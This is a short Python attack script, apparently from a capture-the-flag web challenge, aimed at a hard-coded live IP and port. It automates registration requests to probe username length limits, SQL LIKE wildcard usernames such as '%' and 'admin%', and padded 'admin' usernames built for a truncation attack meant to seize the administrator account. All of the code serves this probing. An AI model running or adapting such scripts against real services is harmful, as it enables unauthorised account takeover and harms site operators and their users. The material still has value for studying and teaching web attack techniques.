import urllib.request, urllib.parse, http.cookiejar, re, time

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def veredict(b):
    if "已被占用" in b:
        return "TAKEN"
    if "用户名过长" in b:
        return "TOOLONG"
    if "开户成功" in b:
        return "OK"
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b))[:60]


def tryreg(u):
    op = sess()
    s, b = req(op, "/register", {"username": u, "password": "p"}, "POST")
    return veredict(b)


print("=== 长度阈值 (a*n)")
for n in [5, 15, 16, 17, 20, 24, 30, 31, 32, 33, 40, 50, 64, 65, 100, 128, 200]:
    print(f"  len={n:4d} -> {tryreg('z'*n)}")

print("\n=== LIKE 探测")
for u in ["%", "_", "%%", "a%", "ad%", "adm%", "admin%", "admin_", "admin__",
          "x%", "z%", "%admin%", "admin%zz"]:
    print(f"  {u!r:12s} -> {tryreg(u)}")

print("\n=== 截断/前缀探测")
for u in ["a" * 32, "a" * 33, "admin" + " " * 26, "admin" + " " * 27, "admin" + "x" * 27,
          "admin" + "\t" * 27, "admin" + "." * 27]:
    print("  %-42s -> %s" % (repr(u)[:40], tryreg(u)))
